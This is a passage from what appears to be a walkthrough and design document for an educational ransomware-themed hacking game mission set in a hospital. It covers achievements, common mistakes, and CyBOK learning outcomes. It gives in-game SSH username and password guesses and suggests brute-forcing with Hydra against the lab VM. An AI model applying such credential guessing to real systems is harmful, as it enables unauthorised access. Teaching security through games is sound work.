- Never detected by guard (stealth bonus)
- Base64 + ROT13 decoded (educational completion)

---

## Achievement Guide

**Story Achievements:**
- **"Infiltrator"** - Complete Mission 2
- **"Ghost Protocol"** - Read Ghost's Manifesto (LORE 1)
- **"Paper Trail"** - Find all 3 LORE fragments
- **"Hacktivist"** - Submit all 4 VM flags

**Ethical Path Achievements:**
- **"Utilitarian"** - Pay ransom (minimize immediate deaths)
- **"Consequentialist"** - Deny ransom (deny ENTROPY funding)
- **"Whistleblower"** - Expose hospital publicly
- **"Diplomat"** - Quiet resolution (protect institution)
- **"Protector"** - Save Gary from scapegoating

**Combat Achievements:**
- **"No Mercy"** - Knock out security guard
- **"Knockout Artist"** - Win guard combat with punch (influence >= 20)
- **"Brawler"** - Win guard combat with wrestling (influence >= 15)
- **"Improviser"** - Win guard combat with fire extinguisher (influence >= 25)

**Stealth Achievements:**
- **"Ghost"** - Complete mission without being detected by guard
- **"Social Engineer"** - Get server room keycard from Gary (no lockpicking)
- **"Master Locksmith"** - Lockpick all containers and doors

**Speedrun Achievements:**
- **"Speed Demon"** - Complete in under 40 minutes
- **"Perfect Run"** - 100% completion in under 70 minutes

---

## Common Mistakes & Solutions

### Mistake 1: Forgot to Read Founding Plaque
**Problem:** Can't solve PIN safe, stuck in Emergency Storage
**Solution:**
- Use PIN cracker device (found in same room)
- OR return to reception_lobby and read founding plaque

### Mistake 2: Guard Keeps Catching Me Lockpicking
**Problem:** Multiple confrontations, mission failed
**Solution:**
- Wait for guard to patrol to left end (waypoint 1)
- Guard pauses 20 ticks at waypoint
- Sprint to server room door during pause
- OR build gary_influence >= 45 to get keycard (skip lockpicking)
- OR knock out guard (combat path)

### Mistake 3: Can't Log Into SSH (VM Challenge 1)
**Problem:** Password not working
**Solution:**
- Ensure you collected password hints from Gary
- Try all username combinations: gary, root, admin, backup
- Try all password hints: Emma2018, Hospital1987, StCatherines
- Use Hydra for brute force if manual attempts fail

### Mistake 4: Gary Won't Give Keycard
**Problem:** gary_influence too low
**Solution:**
- Choose ALL empathetic dialogue options:
  - "This isn't your fault" (+15)
  - "You tried to warn them" (+15)
  - "I'll document your warnings" (+15)
- Get gary_influence >= 45 for keycard
- If already past dialogue, lockpick server room instead

### Mistake 5: Can't Find LORE Fragment 3
**Problem:** Looking for ZDS invoice
**Solution:**
- Located in Dr. Kim's safe (dr_kim_office)
- Enter PIN 1987 (same as emergency safe)
- Safe is in her office, not emergency storage

### Mistake 6: Submitted Flags But No Progress
**Problem:** Flags not recognized
**Solution:**
- Ensure flags submitted at **drop-site terminal** in server room
- NOT at VM terminal itself
- Format must match exactly: `flag{ssh_access_granted}`
- Case-sensitive

### Mistake 7: Ransom Decision Terminal Locked
**Problem:** Can't access decision interface
**Solution:**
- Must complete BOTH Objective 3 AND Objective 4 first
- Objective 3: Submit at least flag 1 + flag 2 (minimum)
- Objective 4: Recover offline backup keys from emergency storage safe
- Both must be complete before ransom decision unlocks

---

## Educational Learning Outcomes

### CyBOK Knowledge Areas Covered

**MAT - Malware & Attack Technologies**
- Ransomware behavior and encryption
- ProFTPD exploitation
- Backdoor command injection
- Attack lifecycle (recon → exploit → encryption → ransom)

**IR - Incident Response**
- Recovery procedures (offline + online keys)
- Backup importance and testing
- Ransomware response decision-making
- Evidence preservation

**NSS - Network Security**
- SSH authentication weaknesses
- FTP service vulnerabilities
- Password patterns and predictability
- Service enumeration

**ACS - Applied Cryptography**
- Encoding vs encryption distinction
- Base64 encoding/decoding
- ROT13 classical cipher
- Symmetric encryption (AES concepts)
- Key management (offline backup keys)

**SS - Systems Security**
- Linux filesystem navigation
- File permissions and access control
- Privilege escalation concepts
- System backup strategies

**HF - Human Factors**
- Social engineering (Gary trust building)
- Insider threat dynamics (Gary scapegoating)
- Organizational security culture
- Budget pressures vs security trade-offs

**AB - Adversarial Behaviours**
- Threat actor motivations (Ghost's ideology)
- Ransomware economics
- Target selection (healthcare sector)
- Operational planning and risk assessment

**SOC - Security Operations**
- Physical security (guard patrol, lockpicking)
- Access control (keycards, PINs)
- Investigation techniques (clue gathering)
- Documentation for accountability

---

## Conclusion

**Mission 2: "Ransomed Trust"** presents a morally complex ransomware scenario where technical skills intersect with ethical decision-making. Players must balance immediate patient safety against long-term consequences, navigate organizational politics, and uncover a deeper conspiracy linking ENTROPY cells.

**Key Takeaways:**
- Ransomware attacks have real human costs
- Security budget cuts create systemic vulnerabilities
- Whistleblowers need protection from institutional scapegoating
- Utilitarian ethics can justify questionable decisions
- Technical skills alone don't resolve ethical dilemmas

**Season 1 Connection:**
LORE Fragment 3 (Zero Day Syndicate Invoice) reveals that ENTROPY cells are coordinating under "The Architect." This sets up Mission 3: "Ghost in the Machine," where players infiltrate the Zero Day Syndicate to disrupt the exploit supply chain.

**Final Statistics (Perfect Run):**
- **Rooms Explored:** 8/8
- **NPCs Met:** 5/5 (Dr. Kim, Gary, Guard, Agent 0x99, Ghost)
- **VM Flags:** 4/4
- **LORE Fragments:** 3/3
- **Moral Choices:** 3/3
- **Completion Time:** 65-75 minutes
- **Mission Score:** 100%

---

**Document Version:** 1.0
**Last Updated:** Mission 2 Development (Session: claude/prepare-mission-2-dev-KRHGY)
**Author:** SAFETYNET Operations Documentation Team